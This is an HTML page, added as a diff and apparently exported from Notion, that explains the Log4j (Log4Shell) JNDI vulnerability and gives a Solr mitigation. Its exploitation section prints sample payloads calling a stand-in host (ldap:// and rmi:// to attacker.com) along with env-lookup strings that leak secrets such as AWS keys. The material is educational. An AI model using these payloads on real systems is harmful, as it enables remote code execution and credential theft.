@@ -1,0 +1,695 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Know Log4j </title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+}
+
+.simple-table-header {
+	background: rgb(247, 246, 243);
+	color: black;
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="0efcdcba-b40a-4cda-b23e-09a20c5d6fe0" class="page sans"><header><img class="page-cover-image" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/images.png" style="object-position:center 51.47999999999999%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/log4j-1.png"/></div><h1 class="page-title">Know Log4j </h1></header><div class="page-body"><p id="b1cc6e26-e4cc-42ab-9bd2-f01cfbb92d12" class="">
+</p><h1 id="2c224c05-5949-4a8b-8b69-13c22c0e4bbc" class="">What is Log4j ?</h1><p id="cad66d4f-e9df-4160-a6e4-c82df2498df4" class="">
+</p><p id="88d72bf9-cfb1-4f31-8b4b-bc439c2351ab" class="">Talking about log4j , it is a popular library for JAVA created in 2001 . This library mainly serves the purpose for logging .</p><p id="72452702-5b44-4f9b-af54-bdd9e4c25b3a" class="">
+</p><p id="7b28b35b-0c25-4898-a7d8-1d9e71661835" class="">So , what a logging library  does , is instead of using the print statement . The developer just uses a wrapper around the logging class or object . So instead of using print(line), the code would look like this:</p><pre id="0339bc7e-b36c-4649-94bb-9785ace1f96f" class="code"><code>logging.INFO(“Application Started”)
+logging.WARN(“File Uploaded”)
+logging.DEBUG(“SQL Query Ran”)</code></pre><p id="6a273c2e-4d77-4f49-86bf-e72911e6432d" class="">
+</p><p id="853be4f6-88fe-4b05-b30e-accf9347e2ec" class="">Then the application has a configuration file which says what log levels (INFO, WARN, DEBUG, etc.) to display. This way when there is a problem with the application, the developer can enable DEBUG mode and instantly get the messages they need to identify the issue.</p><p id="5bb4a174-3f76-4167-a566-2523bed6e686" class="">
+</p><p id="2720224e-ec94-4e23-acd0-044217b061f0" class="">Now, about log4j logging operation it allows us to log expression .  From here we can say that log4j is expression based vulnerability / input validation vulnerability</p><p id="c5b108f3-648b-4201-93ee-102921933b3e" class="">
+</p><hr id="505a4cf1-dddc-4b10-a2ed-3013e431c10d"/><p id="a8a5ffe5-575f-4eaf-a967-671c6707bf6c" class="">
+</p><h1 id="93be38a5-e06a-41ca-b840-3b8ebe4f6bfa" class="">Vulnerability Details</h1><p id="11657cf3-d173-4ec4-8985-d149a028bd7d" class="">The vulnerability introduced to log4j2 in version 2.0 -beta 9 . As JNDI (Java Naming and Directory Interface) lookup plugin was added to it .</p><p id="842e0826-cf4a-4839-b2e1-6c8da283568c" class="">
+</p><p id="70bbcb80-ab8f-4a76-ad8c-dd90d92080c3" class="">This version of log4j allowed lookups to provide a way to add values to it’s configuration . Like <strong>Map Lookups , Environment lookups , JNDI lookups , System Properties lookups .</strong></p><p id="2dd6686e-590c-4863-87c4-e84db66043df" class="">
+</p><p id="de83dfd0-1b0f-43c3-99d1-b32e17db169d" class=""><span style="border-bottom:0.05em solid"><strong>Note: New version added Docker and Kubernetes lookups</strong></span></p><p id="f147fff9-7376-4353-8e30-f442489751e8" class="">
+</p><h2 id="cd9b844e-98d6-4a40-93d8-275a09060d5b" class="">What make issue with JNDI so vulnerable ?</h2><p id="b9db79e1-1b4b-4178-95c7-2e5559fe7379" class="">As we talk about that this version allowed us JNDI lookup . So lets see issue in JNDI lookup</p><ul id="b8410c00-d6d5-4a96-b74e-376319a00239" class="bulleted-list"><li style="list-style-type:disc">Allowing variables to be retrieved using JNDI</li></ul><ul id="ccd35dd3-90d2-459b-87cc-881d4a234f7d" class="bulleted-list"><li style="list-style-type:disc">A number of protocols supported including LDAP, RMI , DNS</li></ul><p id="3fde6249-f895-4973-8377-77f16202d400" class="">
+</p><p id="c83838c6-0217-405c-9a29-49fc9d82baed" class="">Lets talk how these issue affected lo4j library which is using JNDI API for lookups</p><p id="728c4742-2a08-4d79-886b-0052fb5d7dda" class="">
+</p><p id="6859951c-eb5b-4322-87fa-0f4e46f7c2f1" class="">Log4j will parse input and will look for any of the lookups and <strong>it treats all string arguments as format strings !</strong></p><p id="b577ef99-2ab6-4c12-b41c-950171ac95ea" class="">
+</p><p id="1bf54599-b679-44e3-8f35-89d02f581a51" class="">When a lookup is encountered it is processed automatically and JNDI start lookup with <strong>${jndi: . </strong>JNDI/LDAP remote code execution is well-know attack published  at Blackhat by Alvaro Muñoz and Oleksandr Mirosh back in 2015. So inshort LDAP can store JAVA objects via JAVA Serialization or JNDI References and these references can contain inforamtion that will be used to create an instance of an object which leads to RCE.</p><p id="fd34abdb-f029-489b-ad44-b533209bad85" class="">
+</p><p id="14c8de19-7522-473d-8936-11175349f3e7" class="">More about JNDI/LDAP RCE </p><figure id="fc1e2491-0ce9-4fae-9e1b-4b8efae6c23e"><div class="source"><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78">https://www.youtube.com/watch?v=Y8a5nB-vy78</a></div></figure><p id="3c70dd49-9179-4ab3-be92-aadfb9abe05a" class="">
+</p><hr id="e8f3b6bb-263c-4f1a-a038-6308fe6dfd88"/><p id="f1afbcbb-92d8-441d-98db-25e2b16a994c" class="">
+</p><h1 id="9e49289f-7abe-4cfa-96d3-5c5c246fce4a" class="">Expolitation </h1><h3 id="8fe87603-fcb1-45c6-b74d-73d25503c792" class=""> ※  An attacker must submit a JNDI lookup that points to their server</h3><p id="d80ddc57-5fbd-49ec-a3cd-1c1d586fe6d9" class="">
+</p><p id="6e1e55db-1fab-400f-915b-6ffcc29a001e" class="">${jndi:ldap://attacker.com:1234/a}</p><p id="97495b09-8bad-4844-b94a-14e9614f9f48" class="">
+</p><h3 id="70c6b140-d542-4139-8db8-084f5cac1bc2" class="">※ Using RMI </h3><p id="80327457-9db2-41cb-80ba-c833a54bf413" class="">
+</p><p id="a08a4cb1-16af-41d8-8b94-39190b180636" class="">${jndi:rmi://attacker.com:9191/a}</p><p id="8b80bdbe-727c-4e44-add4-f4ba463c0ff6" class="">
+</p><p id="973355c2-ff95-4c3b-bd98-d5b9d192f9d5" class=""><span style="border-bottom:0.05em solid"><strong>• So What actually happens when this hit a log4j vulnerable applications </strong></span></p><ul id="5dd4ca69-1244-43ab-aa1a-a712d944d676" class="bulleted-list"><li style="list-style-type:disc">It will try to resolve/lookup the entry</li></ul><ul id="0a340f0c-9589-44ce-9860-d4b43b29ddc9" class="bulleted-list"><li style="list-style-type:disc">An LDAP request is sent to the attacker</li></ul><ul id="6889176e-3c1e-4d09-9741-f6f60097f20e" class="bulleted-list"><li style="list-style-type:disc">The attacker now replies with a JNDI reference will point to another server hosting class and attacker could reply with a serialized object.</li></ul><p id="fcc9bf32-8071-4ceb-92b1-eeede7c729a5" class="">
+</p><p id="314c11bd-a3dd-4773-af97-7e28625cadd3" class="">
+</p><p id="3b15ec4e-9c26-4ee1-b69b-6770c0f311ae" class=""><span style="border-bottom:0.05em solid"><strong>• Attacker Replies with a JNDI reference </strong></span></p><p id="05f799e1-ecca-4247-b6bc-344e3225c7e1" class="">
+</p><ul id="80f07367-26e3-4029-b87f-bbb7b5de8f5d" class="bulleted-list"><li style="list-style-type:disc">The reference is followed</li></ul><ul id="53bc6a7d-39e1-4ddf-9e43-8cf79d9aa0b9" class="bulleted-list"><li style="list-style-type:disc">A class is downloaded</li></ul><ul id="f0bc7884-7200-4d12-befe-95dad533a467" class="bulleted-list"><li style="list-style-type:disc">The class gets executed and shazam u got shell</li></ul><p id="3bd83233-9f3b-4a40-aa9a-506c7f21bb7f" class="">
+</p><p id="4aa2fbdc-9af7-4e9a-899b-d24ca8a18661" class="">POC</p><figure id="d4fbb0e3-e8e0-4adc-9c14-6aac8bac7b3c"><div class="source"><a href="https://youtu.be/kyHdolL0Zt0">https://youtu.be/kyHdolL0Zt0</a></div></figure><p id="b166b4ee-befe-4735-ae63-7c823cb924c1" class="">
+</p><p id="605beaf1-4b9d-41e2-965b-1b75501e4119" class=""><strong>→ Similar steps can be used to reproduce attack using RMI</strong></p><p id="e4cc7514-9a8e-475f-bcb8-1eb5bb8ec2e6" class="">
+</p><p id="c314fcd5-214b-4ada-8483-0ce985e5a391" class="">• <strong>The JNDI resolver will automatically resolve DNS name </strong></p><p id="c380bf5c-18dc-4d75-a90e-471c8635e96b" class="">
+</p><p id="ee6b4466-ba7d-49cd-acbe-21adf555febc" class="">This can be used to bypass and get access of sensitive data due to other lookups !</p><ul id="96b7facf-f17a-480d-8c11-a359ce19dd3f" class="bulleted-list"><li style="list-style-type:disc">One can read environment variables with ${env</li></ul><ul id="74056b18-2be2-4d29-8c41-68e6976f6ddc" class="bulleted-list"><li style="list-style-type:disc">Formatting is nestable!</li></ul><ul id="319b7d69-9dd5-4e11-9148-8781d0e9d496" class="bulleted-list"><li style="list-style-type:disc">payload may for env : ${env:USER}, ${env:AWS_ACCESS_KEY_ID}</li></ul><p id="09a94e78-5f7c-4212-8313-6b61ceb1309f" class="">
+</p><p id="a377c8ae-0d2c-44cf-b0d2-81059d725db6" class=""> </p><h2 id="8390ffa8-bff6-484c-a710-82849fada456" class="">• Anything that user supplies and gets parsed by log4j is potential input vector</h2><p id="2697ff55-7f79-4f0a-a538-aa2404f2f9ee" class="">
+</p><hr id="dee716d0-7cfa-4905-a9df-fa0b258e9417"/><p id="bcb90b8e-c059-4850-a857-4472524e0c95" class="">
+</p><h1 id="47e97a1f-53f9-4eb7-ad2c-2c2dd4ef076f" class="">Mitigations</h1><p id="2ab44cbf-6994-4df5-b771-b5ccb212a8aa" class="">
+</p><p id="3f7c2d60-cc6d-404d-9b01-5ccf1408eb01" class="">There are two mitigations for this one is obvious to stay updated and other one  is manual , here let see how its done manually</p><p id="ec045d5d-d07c-4214-a0f0-04b13c391177" class="">
+</p><p id="ab343700-fe30-4b10-8200-bd2d86b32ff4" class="">So , there is file <a href="http://solr.in.sh">solr.in.sh</a>  which can be used for defensive purpose . But how ?</p><p id="cf5f3c98-d180-40ee-b2bb-ccd0efc9b5d2" class="">
+</p><p id="a479451f-a3dc-46e4-a526-e9dfc5413b42" class="">Locate that file and add this specific syntax</p><p id="0181479d-3f78-4f18-be03-985bcfee7c77" class=""> </p><pre id="65ad3580-1ff7-49ad-99e7-a065309aeff5" class="code"><code>SOLR_OPTS=&quot;$SOLR_OPTS -Dlog4j2.formatMsgNoLookups=true&quot;</code></pre><p id="c42d9e29-38b9-4613-a034-7432c33e6dab" class="">
+</p><p id="c96fbe68-8604-4029-82d9-fd0541f80641" class="">after restarting service by init.d now no reply will be going to forwarded to curl </p><p id="587b649a-154d-45db-8bf1-17d9a82dda88" class="">
+</p><hr id="27858fad-14fd-4e53-98b2-4838ee2b0e2e"/><figure id="089b6dfd-7a9c-44ff-b829-274db44afc41" class="image"><a href="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/Kshitij_(Custom)-modified_(Custom).png"><img style="width:95px" src="Know%20Log4j%20089b6dfd7a9c44ffb829274db44afc41/Kshitij_(Custom)-modified_(Custom).png"/></a></figure><b><u><center><p id="05c74bca-98d8-40b1-8723-ec8203721dfb" class="" >Kshitij Raj </p></center></b></u><b></u><center><p id="57068522-18e8-4294-acc1-c59a5eaa5187" class="">CyberSecurity Enthusiast and Researcher </p></center></b></u><p id="c0d8f886-471a-43e9-9ca7-646beec9bde2" class="">
+</p><a href="index.html"><p id="049bebce-04a1-4c22-ade4-a7a675b90929" class="">&lt;&lt; Back to home</p></a></div></article></body></html>
